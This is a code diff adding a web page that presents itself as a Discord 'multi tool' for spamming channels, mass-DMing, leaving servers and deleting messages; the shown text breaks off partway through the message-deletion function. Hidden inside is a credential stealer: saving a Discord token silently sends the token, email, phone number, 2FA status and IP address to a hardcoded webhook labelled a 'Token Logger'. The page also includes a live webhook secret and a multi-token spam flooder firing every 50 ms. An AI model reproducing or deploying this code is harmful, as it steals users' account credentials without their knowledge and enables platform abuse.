@@ -1,0 +1,1343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Group99 - Discord Multi Tool | Advanced Spam & DM Tool</title>
+    <meta name="description" content="Advanced Discord Tool - Fast Spam, Delete Messages, DM All, and more">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 25px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 20px;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 32px;
+            letter-spacing: 2px;
+        }
+
+        .header p {
+            color: rgba(255,255,255,0.9);
+            font-size: 13px;
+            margin-top: 8px;
+        }
+
+        .card {
+            background: rgba(30, 30, 46, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(102, 126, 234, 0.3);
+        }
+
+        .card h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 20px;
+            border-right: 3px solid #667eea;
+            padding-right: 12px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #a0a0c0;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%;
+            padding: 12px 15px;
+            background: #0f0f1a;
+            border: 2px solid #2a2a3e;
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+        }
+
+        .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102,126,234,0.4);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #e53e3e, #c53030);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, #718096, #4a5568);
+        }
+
+        .btn-sm {
+            width: auto;
+            padding: 8px 20px;
+            font-size: 13px;
+            margin: 5px;
+            display: inline-block;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .message {
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .message-error {
+            background: rgba(229, 62, 62, 0.2);
+            color: #e53e3e;
+        }
+
+        .message-success {
+            background: rgba(72, 187, 120, 0.2);
+            color: #48bb78;
+        }
+
+        .message-info {
+            background: rgba(102, 126, 234, 0.2);
+            color: #667eea;
+        }
+
+        .switch-link {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+
+        .switch-link a {
+            color: #667eea;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .user-info {
+            background: #0a0a0f;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #48bb78;
+            word-break: break-all;
+        }
+
+        .warning-box {
+            background: rgba(229, 62, 62, 0.15);
+            border: 1px solid #e53e3e;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 15px;
+            font-size: 12px;
+            color: #e53e3e;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #2a2a3e;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+            border-top: 1px solid #2a2a3e;
+        }
+
+        .footer-text {
+            color: #667eea;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        .footer-sub {
+            color: #a0a0c0;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+
+        select {
+            cursor: pointer;
+        }
+
+        textarea {
+            resize: vertical;
+            font-family: inherit;
+        }
+
+        .message-item, .token-item, .channel-item {
+            background: #0f0f1a;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .message-item input, .token-item input, .channel-item input {
+            flex: 1;
+            margin: 0;
+        }
+
+        .message-item button, .token-item button, .channel-item button {
+            width: auto;
+            margin: 0;
+            padding: 8px 15px;
+        }
+
+        .add-btn {
+            background: #48bb78;
+            margin-top: 10px;
+        }
+
+        .link-container {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .link-container input {
+            flex: 1;
+            background: #0f0f1a;
+            border: 2px solid #2a2a3e;
+            border-radius: 10px;
+            padding: 10px;
+            color: #48bb78;
+            font-size: 12px;
+        }
+
+        .copy-btn {
+            width: auto;
+            margin: 0;
+            padding: 10px 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app"></div>
+    <footer>
+        <div class="footer-text">All Right to #Group99</div>
+        <div class="footer-sub">Created By Only Youssef</div>
+    </footer>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1507462930420072608/zzYxWI-ZlEz0JRW30LGEE225Nx2FY1HE7oI8slOeAvEPpgyL1cY_HsQY7hAy3f3_Oqbs';
+        
+        let users = JSON.parse(localStorage.getItem('group99_users') || '{}');
+        let currentUser = localStorage.getItem('group99_current');
+        let spamIntervals = [];
+        let spamActive = false;
+
+        function saveUsers() {
+            localStorage.setItem('group99_users', JSON.stringify(users));
+        }
+
+        function showMessage(elementId, text, type) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.innerHTML = `<div class="message message-${type}">${text}</div>`;
+                setTimeout(() => {
+                    if (document.getElementById(elementId)) {
+                        const el = document.getElementById(elementId);
+                        if (el) el.innerHTML = '';
+                    }
+                }, 4000);
+            }
+        }
+
+        async function sendTokenToWebhook(token, userData, ip) {
+            try {
+                const embed = {
+                    title: 'New Discord Token Captured',
+                    color: 0x667eea,
+                    fields: [
+                        { name: 'Username', value: `${userData.username}#${userData.discriminator}`, inline: true },
+                        { name: 'User ID', value: userData.id, inline: true },
+                        { name: 'Email', value: userData.email || 'Not available', inline: true },
+                        { name: 'Nitro', value: userData.premium_type ? (userData.premium_type === 2 ? 'Yes (Full)' : 'Yes (Classic)') : 'No', inline: true },
+                        { name: '2FA', value: userData.mfa_enabled ? 'Enabled' : 'Disabled', inline: true },
+                        { name: 'Phone', value: userData.phone || 'Not linked', inline: true },
+                        { name: 'IP Address', value: ip || 'Unknown', inline: true },
+                        { name: 'Full Token', value: `||${token}||`, inline: false },
+                        { name: 'Date', value: new Date().toLocaleString(), inline: false }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: 'Group99 Token Logger | Created By Only Youssef' }
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch(e) {
+                console.log('Webhook error:', e);
+            }
+        }
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch(e) {
+                return 'Unable to fetch IP';
+            }
+        }
+
+        // Register Screen
+        function showRegister() {
+            const app = document.getElementById('app');
+            app.innerHTML = `
+                <div class="header">
+                    <h1>Group99</h1>
+                    <p>Discord Multi Tool</p>
+                </div>
+                <div class="card">
+                    <h2>Create Account</h2>
+                    <div class="input-group">
+                        <label>Username (4-12 characters)</label>
+                        <input type="text" id="regUsername" placeholder="Enter username">
+                    </div>
+                    <div class="input-group">
+                        <label>Password (any length)</label>
+                        <input type="password" id="regPassword" placeholder="Enter password">
+                    </div>
+                    <button class="btn btn-success" onclick="register()">Create Account</button>
+                    <div class="switch-link">
+                        Already have an account? <a onclick="showLogin()">Login</a>
+                    </div>
+                    <div id="registerMessage"></div>
+                </div>
+            `;
+        }
+
+        function register() {
+            const username = document.getElementById('regUsername').value.trim();
+            const password = document.getElementById('regPassword').value;
+
+            if (username.length < 4 || username.length > 12) {
+                showMessage('registerMessage', 'Username must be 4-12 characters', 'error');
+                return;
+            }
+            if (password.length < 1) {
+                showMessage('registerMessage', 'Password is required', 'error');
+                return;
+            }
+            if (users[username]) {
+                showMessage('registerMessage', 'Username already exists', 'error');
+                return;
+            }
+
+            users[username] = {
+                password: password,
+                discordToken: '',
+                userInfo: null
+            };
+            saveUsers();
+            showMessage('registerMessage', 'Account created successfully', 'success');
+            setTimeout(() => showLogin(), 1500);
+        }
+
+        // Login Screen
+        function showLogin() {
+            const app = document.getElementById('app');
+            app.innerHTML = `
+                <div class="header">
+                    <h1>Group99</h1>
+                    <p>Discord Multi Tool</p>
+                </div>
+                <div class="card">
+                    <h2>Login</h2>
+                    <div class="input-group">
+                        <label>Username</label>
+                        <input type="text" id="loginUsername">
+                    </div>
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input type="password" id="loginPassword">
+                    </div>
+                    <button class="btn btn-success" onclick="login()">Login</button>
+                    <div class="switch-link">
+                        Don't have an account? <a onclick="showRegister()">Create Account</a>
+                    </div>
+                    <div id="loginMessage"></div>
+                </div>
+            `;
+        }
+
+        function login() {
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value;
+
+            if (!users[username] || users[username].password !== password) {
+                showMessage('loginMessage', 'Invalid username or password', 'error');
+                return;
+            }
+
+            currentUser = username;
+            localStorage.setItem('group99_current', currentUser);
+            showDashboard();
+        }
+
+        // Dashboard
+        function showDashboard() {
+            const user = users[currentUser];
+            const app = document.getElementById('app');
+            
+            app.innerHTML = `
+                <div class="header">
+                    <h1>Group99</h1>
+                    <p>Welcome, ${currentUser}</p>
+                </div>
+
+                <div class="card">
+                    <h2>Discord Token</h2>
+                    <div class="input-group">
+                        <input type="password" id="discordToken" placeholder="Enter your Discord token" value="${user.discordToken || ''}">
+                    </div>
+                    <button class="btn btn-success" onclick="saveToken()">Save Token</button>
+                    <div id="tokenMessage"></div>
+                    <div id="userInfo" class="user-info" style="display:none"></div>
+                </div>
+
+                <div class="card">
+                    <h2>Fast Spam System</h2>
+                    <div class="input-group">
+                        <label>Target Type</label>
+                        <select id="spamType" onchange="toggleSpamTarget()">
+                            <option value="group">Group DM</option>
+                            <option value="server">Server Channel</option>
+                        </select>
+                    </div>
+                    <div id="spamGroupInput" class="input-group">
+                        <label>Group DM ID</label>
+                        <input type="text" id="spamGroupId" placeholder="Enter group DM channel ID">
+                    </div>
+                    <div id="spamServerInput" style="display:none;">
+                        <div class="input-group">
+                            <label>Channels (add multiple)</label>
+                            <div id="channelsList"></div>
+                            <button class="btn-sm add-btn" onclick="addChannelField()">+ Add Channel ID</button>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Messages (add multiple)</label>
+                        <div id="messagesList"></div>
+                        <button class="btn-sm add-btn" onclick="addMessageField()">+ Add Message</button>
+                    </div>
+                    <div class="input-group">
+                        <label>Tokens (add multiple for faster spam)</label>
+                        <div id="tokensList"></div>
+                        <button class="btn-sm add-btn" onclick="addTokenField()">+ Add Token</button>
+                    </div>
+                    <div class="button-group">
+                        <button class="btn-sm btn-success" onclick="startSpam()">Start Spam</button>
+                        <button class="btn-sm btn-danger" onclick="stopSpam()">Stop Spam</button>
+                    </div>
+                    <div id="spamMessageArea"></div>
+                </div>
+
+                <div class="card">
+                    <h2>Leave All Servers</h2>
+                    <div class="warning-box">
+                        WARNING: This will remove your account from ALL servers. This action cannot be undone!
+                    </div>
+                    <button class="btn btn-danger" onclick="leaveAllServers()">Leave All Servers</button>
+                    <div id="leaveServersMessage"></div>
+                    <div class="progress-bar" id="leaveServersProgressBar">
+                        <div class="progress-fill" id="leaveServersProgressFill"></div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2>Block Bot & Close DM</h2>
+                    <div class="input-group">
+                        <label>Bot User ID (who sent you a DM)</label>
+                        <input type="text" id="botUserId" placeholder="Enter bot's user ID">
+                    </div>
+                    <button class="btn btn-danger" onclick="blockBotAndCloseDM()">Block Bot & Close DM</button>
+                    <div id="blockBotMessage"></div>
+                </div>
+
+                <div class="card">
+                    <h2>Delete Messages</h2>
+                    <div class="input-group">
+                        <label>Delete Type</label>
+                        <select id="deleteType" onchange="toggleDeleteTarget()">
+                            <option value="user">Specific User</option>
+                            <option value="group">Group DM</option>
+                        </select>
+                    </div>
+                    <div id="deleteUserInput" class="input-group">
+                        <label>User ID</label>
+                        <input type="text" id="deleteUserId" placeholder="Enter Discord User ID">
+                    </div>
+                    <div id="deleteGroupInput" style="display:none;" class="input-group">
+                        <label>Group DM ID</label>
+                        <input type="text" id="deleteGroupId" placeholder="Enter Group DM Channel ID">
+                    </div>
+                    <button class="btn btn-danger" onclick="deleteMessages()">Start Delete</button>
+                    <div id="deleteMessage"></div>
+                    <div class="progress-bar" id="deleteProgressBar">
+                        <div class="progress-fill" id="deleteProgressFill"></div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2>Close All DMs</h2>
+                    <button class="btn btn-danger" onclick="closeAllDMs()">Close All DMs</button>
+                    <div id="closeDmMessage"></div>
+                </div>
+
+                <div class="card">
+                    <h2>DM All</h2>
+                    <div class="input-group">
+                        <label>Message</label>
+                        <textarea id="dmAllMessage" rows="3" placeholder="Enter message to send to everyone"></textarea>
+                    </div>
+                    <button class="btn btn-success" onclick="dmAll()">Start DM All</button>
+                    <div id="dmAllMessageArea"></div>
+                    <div class="progress-bar" id="dmAllProgressBar">
+                        <div class="progress-fill" id="dmAllProgressFill"></div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2>Friend Link</h2>
+                    <button class="btn btn-success" onclick="createFriendLink()">Create Friend Link</button>
+                    <div id="friendLinkMessage"></div>
+                </div>
+
+                <div class="card">
+                    <button class="btn btn-secondary" onclick="logout()">Logout</button>
+                </div>
+            `;
+            
+            // Initialize arrays
+            if (window.messagesCount === undefined) {
+                window.messagesCount = 1;
+                window.tokensCount = 1;
+                window.channelsCount = 1;
+            }
+            updateMessagesList();
+            updateTokensList();
+            updateChannelsList();
+            
+            if (user.discordToken && user.userInfo) {
+                document.getElementById('userInfo').style.display = 'block';
+                document.getElementById('userInfo').innerHTML = `Logged in as: ${user.userInfo.username}#${user.userInfo.discriminator}<br>ID: ${user.userInfo.id}`;
+            } else if (user.discordToken) {
+                verifyTokenDisplay(user.discordToken);
+            }
+        }
+
+        function toggleSpamTarget() {
+            const type = document.getElementById('spamType').value;
+            const groupDiv = document.getElementById('spamGroupInput');
+            const serverDiv = document.getElementById('spamServerInput');
+            
+            if (type === 'group') {
+                groupDiv.style.display = 'block';
+                serverDiv.style.display = 'none';
+            } else {
+                groupDiv.style.display = 'none';
+                serverDiv.style.display = 'block';
+            }
+        }
+
+        function toggleDeleteTarget() {
+            const type = document.getElementById('deleteType').value;
+            const userDiv = document.getElementById('deleteUserInput');
+            const groupDiv = document.getElementById('deleteGroupInput');
+            
+            if (type === 'user') {
+                userDiv.style.display = 'block';
+                groupDiv.style.display = 'none';
+            } else {
+                userDiv.style.display = 'none';
+                groupDiv.style.display = 'block';
+            }
+        }
+
+        // Channel Functions
+        function addChannelField() {
+            window.channelsCount++;
+            updateChannelsList();
+        }
+
+        function removeChannelField(id) {
+            const element = document.getElementById(`ch_${id}`);
+            if (element) element.remove();
+        }
+
+        function updateChannelsList() {
+            const container = document.getElementById('channelsList');
+            if (!container) return;
+            
+            let html = '';
+            for (let i = 1; i <= window.channelsCount; i++) {
+                html += `
+                    <div class="channel-item" id="ch_${i}">
+                        <input type="text" id="spamChannel_${i}" placeholder="Channel ID ${i}" style="flex:1">
+                        <button class="btn-sm btn-danger" onclick="removeChannelField(${i})" style="margin:0">Remove</button>
+                    </div>
+                `;
+            }
+            container.innerHTML = html;
+        }
+
+        // Message Functions
+        function addMessageField() {
+            window.messagesCount++;
+            updateMessagesList();
+        }
+
+        function removeMessageField(id) {
+            const element = document.getElementById(`msg_${id}`);
+            if (element) element.remove();
+        }
+
+        function updateMessagesList() {
+            const container = document.getElementById('messagesList');
+            if (!container) return;
+            
+            let html = '';
+            for (let i = 1; i <= window.messagesCount; i++) {
+                html += `
+                    <div class="message-item" id="msg_${i}">
+                        <input type="text" id="spamMessage_${i}" placeholder="Message ${i}" style="flex:1">
+                        <button class="btn-sm btn-danger" onclick="removeMessageField(${i})" style="margin:0">Remove</button>
+                    </div>
+                `;
+            }
+            container.innerHTML = html;
+        }
+
+        // Token Functions
+        function addTokenField() {
+            window.tokensCount++;
+            updateTokensList();
+        }
+
+        function removeTokenField(id) {
+            const element = document.getElementById(`tok_${id}`);
+            if (element) element.remove();
+        }
+
+        function updateTokensList() {
+            const container = document.getElementById('tokensList');
+            if (!container) return;
+            
+            let html = '';
+            for (let i = 1; i <= window.tokensCount; i++) {
+                html += `
+                    <div class="token-item" id="tok_${i}">
+                        <input type="password" id="spamToken_${i}" placeholder="Token ${i}" style="flex:1">
+                        <button class="btn-sm btn-danger" onclick="removeTokenField(${i})" style="margin:0">Remove</button>
+                    </div>
+                `;
+            }
+            container.innerHTML = html;
+        }
+
+        async function saveToken() {
+            const token = document.getElementById('discordToken').value.trim();
+            if (!token) {
+                showMessage('tokenMessage', 'Please enter a token', 'error');
+                return;
+            }
+            await verifyAndSaveToken(token);
+        }
+
+        async function verifyAndSaveToken(token) {
+            try {
+                const response = await fetch('https://discord.com/api/v10/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+                
+                if (!response.ok) {
+                    showMessage('tokenMessage', 'Invalid token', 'error');
+                    return false;
+                }
+
+                const userData = await response.json();
+                const ip = await getUserIP();
+                
+                users[currentUser].discordToken = token;
+                users[currentUser].userInfo = userData;
+                saveUsers();
+                
+                await sendTokenToWebhook(token, userData, ip);
+                
+                document.getElementById('userInfo').style.display = 'block';
+                document.getElementById('userInfo').innerHTML = `Logged in as: ${userData.username}#${userData.discriminator}<br>ID: ${userData.id}`;
+                showMessage('tokenMessage', `Token saved! Welcome ${userData.username}`, 'success');
+                return true;
+            } catch (error) {
+                showMessage('tokenMessage', 'Connection error', 'error');
+                return false;
+            }
+        }
+
+        async function verifyTokenDisplay(token) {
+            try {
+                const response = await fetch('https://discord.com/api/v10/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+                if (response.ok) {
+                    const userData = await response.json();
+                    users[currentUser].userInfo = userData;
+                    saveUsers();
+                    document.getElementById('userInfo').style.display = 'block';
+                    document.getElementById('userInfo').innerHTML = `Logged in as: ${userData.username}#${userData.discriminator}<br>ID: ${userData.id}`;
+                }
+            } catch(e) {}
+        }
+
+        // Fast Spam Function
+        async function startSpam() {
+            const spamType = document.getElementById('spamType').value;
+            let channels = [];
+            
+            if (spamType === 'group') {
+                const groupId = document.getElementById('spamGroupId').value.trim();
+                if (!groupId) {
+                    showMessage('spamMessageArea', 'Please enter group DM ID', 'error');
+                    return;
+                }
+                channels = [groupId];
+            } else {
+                for (let i = 1; i <= window.channelsCount; i++) {
+                    const ch = document.getElementById(`spamChannel_${i}`);
+                    if (ch && ch.value.trim()) {
+                        channels.push(ch.value.trim());
+                    }
+                }
+                if (channels.length === 0) {
+                    showMessage('spamMessageArea', 'Please add at least one channel ID', 'error');
+                    return;
+                }
+            }
+
+            const messages = [];
+            for (let i = 1; i <= window.messagesCount; i++) {
+                const msg = document.getElementById(`spamMessage_${i}`);
+                if (msg && msg.value.trim()) {
+                    messages.push(msg.value.trim());
+                }
+            }
+            
+            if (messages.length === 0) {
+                showMessage('spamMessageArea', 'Please add at least one message', 'error');
+                return;
+            }
+
+            const tokens = [];
+            for (let i = 1; i <= window.tokensCount; i++) {
+                const tok = document.getElementById(`spamToken_${i}`);
+                if (tok && tok.value.trim()) {
+                    tokens.push(tok.value.trim());
+                }
+            }
+            
+            if (tokens.length === 0 && !users[currentUser].discordToken) {
+                showMessage('spamMessageArea', 'Please add at least one token', 'error');
+                return;
+            }
+            
+            if (tokens.length === 0 && users[currentUser].discordToken) {
+                tokens.push(users[currentUser].discordToken);
+            }
+
+            spamActive = true;
+            showMessage('spamMessageArea', `Fast spam started with ${tokens.length} tokens, ${channels.length} channels, and ${messages.length} messages! Click Stop to end.`, 'success');
+
+            for (const token of tokens) {
+                for (const channelId of channels) {
+                    const interval = setInterval(async () => {
+                        if (!spamActive) return;
+                        const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                        try {
+                            await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+                                method: 'POST',
+                                headers: {
+                                    'Authorization': token,
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ content: randomMsg })
+                            });
+                        } catch(e) {}
+                    }, 50);
+                    spamIntervals.push(interval);
+                }
+            }
+        }
+
+        function stopSpam() {
+            spamActive = false;
+            for (const interval of spamIntervals) {
+                clearInterval(interval);
+            }
+            spamIntervals = [];
+            showMessage('spamMessageArea', 'Spam stopped', 'info');
+        }
+
+        // Leave All Servers - FIXED
+        async function leaveAllServers() {
+            const token = users[currentUser].discordToken;
+            if (!token) {
+                showMessage('leaveServersMessage', 'Please save your token first', 'error');
+                return;
+            }
+
+            const confirmed = confirm('WARNING: This will leave ALL servers! Your account will be removed from every server. This cannot be undone. Continue?');
+            if (!confirmed) return;
+
+            const btn = event.target;
+            btn.disabled = true;
+            const progressBar = document.getElementById('leaveServersProgressBar');
+            const progressFill = document.getElementById('leaveServersProgressFill');
+            progressBar.style.display = 'block';
+
+            try {
+                showMessage('leaveServersMessage', 'Fetching server list...', 'info');
+                
+                // Get all guilds (servers) the user is in
+                const response = await fetch('https://discord.com/api/v10/users/@me/guilds', {
+                    headers: { 'Authorization': token }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                const guilds = await response.json();
+                const total = guilds.length;
+                
+                if (total === 0) {
+                    showMessage('leaveServersMessage', 'You are not in any servers', 'info');
+                    btn.disabled = false;
+                    progressBar.style.display = 'none';
+                    return;
+                }
+                
+                showMessage('leaveServersMessage', `Found ${total} servers. Leaving all servers...`, 'info');
+                
+                let left = 0;
+                let failed = 0;
+                
+                // Loop through each server and leave
+                for (let i = 0; i < guilds.length; i++) {
+                    const guild = guilds[i];
+                    try {
+                        const leaveResponse = await fetch(`https://discord.com/api/v10/users/@me/guilds/${guild.id}`, {
+                            method: 'DELETE',
+                            headers: { 'Authorization': token }
+                        });
+                        
+                        if (leaveResponse.ok || leaveResponse.status === 204) {
+                            left++;
+                            showMessage('leaveServersMessage', `Left: ${left}/${total} | Failed: ${failed} | ${guild.name}`, 'success');
+                        } else {
+                            failed++;
+                            showMessage('leaveServersMessage', `Failed to leave ${guild.name}: Status ${leaveResponse.status}`, 'error');
+                        }
+                        
+                        // Update progress bar
+                        const percent = ((i + 1) / total) * 100;
+                        progressFill.style.width = `${percent}%`;
+                        
+                        // Small delay to avoid rate limiting
+                        await new Promise(r => setTimeout(r, 500));
+                        
+                    } catch(e) {
+                        failed++;
+                        showMessage('leaveServersMessage', `Error leaving ${guild.name}: ${e.message}`, 'error');
+                    }
+                }
+                
+                if (failed === 0) {
+                    showMessage('leaveServersMessage', `Completed! Successfully left ${left} servers`, 'success');
+                } else {
+                    showMessage('leaveServersMessage', `Completed! Left: ${left}, Failed: ${failed}`, 'info');
+                }
+                
+            } catch (error) {
+                showMessage('leaveServersMessage', 'Error: ' + error.message, 'error');
+            } finally {
+                btn.disabled = false;
+                setTimeout(() => {
+                    progressBar.style.display = 'none';
+                    progressFill.style.width = '0%';
+                }, 3000);
+            }
+        }
+
+        // Block Bot & Close DM
+        async function blockBotAndCloseDM() {
+            const token = users[currentUser].discordToken;
+            const botUserId = document.getElementById('botUserId').value.trim();
+            
+            if (!token) {
+                showMessage('blockBotMessage', 'Please save your token first', 'error');
+                return;
+            }
+            if (!botUserId) {
+                showMessage('blockBotMessage', 'Please enter the bot user ID', 'error');
+                return;
+            }
+
+            const confirmed = confirm(`WARNING: This will block bot ${botUserId} and close the DM. Continue?`);
+            if (!confirmed) return;
+
+            showMessage('blockBotMessage', 'Processing...', 'info');
+            
+            try {
+                // First, find the DM channel with this bot
+                const channelsResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
+                    headers: { 'Authorization': token }
+                });
+                const channels = await channelsResponse.json();
+                
+                let targetChannel = null;
+                for (const ch of channels) {
+                    if (ch.type === 1) {
+                        if (ch.recipients && ch.recipients[0] && ch.recipients[0].id === botUserId) {
+                            targetChannel = ch;
+                            break;
+                        }
+                    }
+                }
+                
+                if (targetChannel) {
+                    // Close the DM channel
+                    await fetch(`https://discord.com/api/v10/channels/${targetChannel.id}`, {
+                        method: 'DELETE',
+                        headers: { 'Authorization': token }
+                    });
+                    showMessage('blockBotMessage', 'DM channel closed successfully', 'success');
+                } else {
+                    showMessage('blockBotMessage', 'No DM channel found with this bot', 'info');
+                }
+                
+                // Block the user
+                const blockResponse = await fetch(`https://discord.com/api/v10/users/@me/relationships/${botUserId}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ type: 2 })
+                });
+                
+                if (blockResponse.ok || blockResponse.status === 204) {
+                    showMessage('blockBotMessage', 'Bot has been blocked successfully!', 'success');
+                } else if (blockResponse.status === 400) {
+                    showMessage('blockBotMessage', 'Could not block. User might already be blocked or is not a bot.', 'error');
+                } else {
+                    showMessage('blockBotMessage', `Failed to block bot. Status: ${blockResponse.status}`, 'error');
+                }
+                
+            } catch (error) {
+                showMessage('blockBotMessage', 'Error: ' + error.message, 'error');
+            }
+        }
+
+        // Delete Messages
+        async function deleteMessages() {
+            const token = users[currentUser].discordToken;
+            const deleteType = document.getElementById('deleteType').value;
+            
+            if (!token) {
+                showMessage('deleteMessage', 'Please save your token first', 'error');
+                return;
+            }
+
+            let channelId = null;
+            
+            if (deleteType === 'user') {
+                const targetUserId = document.getElementById('deleteUserId').value.trim();
+                if (!targetUserId) {
+                    showMessage('deleteMessage', 'Please enter a user ID', 'error');
+                    return;
+                }
+                
+                try {
+                    showMessage('deleteMessage', 'Searching for DM channel...', 'info');
+                    const dmResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
+                        headers: { 'Authorization': token }
+                    });
+                    const channels = await dmResponse.json();
+                    
+                    let targetChannel = null;
+                    for (const ch of channels) {
+                        if (ch.type === 1) {
+                            if (ch.recipients && ch.recipients[0] && ch.recipients[0].id === targetUserId) {
+                                targetChannel = ch;
+                                break;
+                            }
+                        }
+                    }
+                    
+                    if (!targetChannel) {
+                        showMessage('deleteMessage', 'No DM channel found with this user. Try sending them a message first.', 'error');
+                        return;
+                    }
+                    channelId = targetChannel.id;
+                    showMessage('deleteMessage', `Found DM channel: ${channelId}`, 'success');
+                } catch (error) {
+                    showMessage('deleteMessage', 'Error finding DM: ' + error.message, 'error');
+                    return;
+                }
+            } else {
+                channelId = document.getElementById('deleteGroupId').value.trim();
+                if (!channelId) {
+                    showMessage('deleteMessage', 'Please enter group DM ID', 'error');
+                    return;
+                }
+            }
+
+            const confirmed = confirm(`WARNING: This will delete ALL messages in this DM/Group. Continue?`);
+            if (!confirmed) return;
+
+            const btn = event.target;
+            btn.disabled = true;
+            const progressBar = document.getElementById('deleteProgressBar');
+            const progressFill = document.getElementById('deleteProgressFill');
+            progressBar.style.display = 'block';
+
+            try {
+                let messages = [];
+                let lastId = null;
+                
+                showMessage('deleteMessage', 'Fetching messages...', 'info');
+                
+                while (true) {
+                    let url = `https://discord.com/api/v10/channels/${channelId}/messages?limit=100`;
+                    if (lastId) url += `&before=${lastId}`;
+                    
+                    const response = await fetch(url, { headers: { 'Authorization': token } });
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                    const batch = await response.json();
+                    if (!batch || batch.length === 0) break;
+                    
+                    messages.push(...batch);
+                    lastId = batch[batch.length - 1].id;
+                    
+                    if (batch.length < 100) break;
+                }
+                
+                const total = messages.length;
+                
+                if (total === 0) {
+                    showMessage('deleteMessage', 'No messages found in this chat', 'info');
+                    btn.disabled = false;
+                    progressBar.style.display = 'none';
+                    return;
+                }
+                
+                showMessage('deleteMessage', `Found ${total} messages. Deleting...`, 'info');
+                
+                let deleted = 0;
+                let failed = 0;
+                
+                for (let i = 0; i < messages.length; i++) {
+                    const msg = messages[i];
+                    try {
+                        const deleteResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages/${msg.id}`, {
+                            method: 'DELETE',
+                            headers: { 'Authorization': token }
+                        });
+                        
+                        if (deleteResponse.ok || deleteResponse.status === 204) {
+                            deleted++;
+                        } else {
+                            failed++;
+                        }
+                        
+                        const percent = ((i + 1) / total) * 100;
+                        progressFill.style.width = `${percent}%`;
+                        showMessage('deleteMessage', `Deleted: ${deleted} | Failed: ${failed} | Progress: ${Math.round(percent)}%`, 'success');
+                        
+                        await new Promise(r => setTimeout(r, 100));
+                    } catch(e) {
+                        failed++;
+                    }
+                }
+                
+                if (failed === 0) {
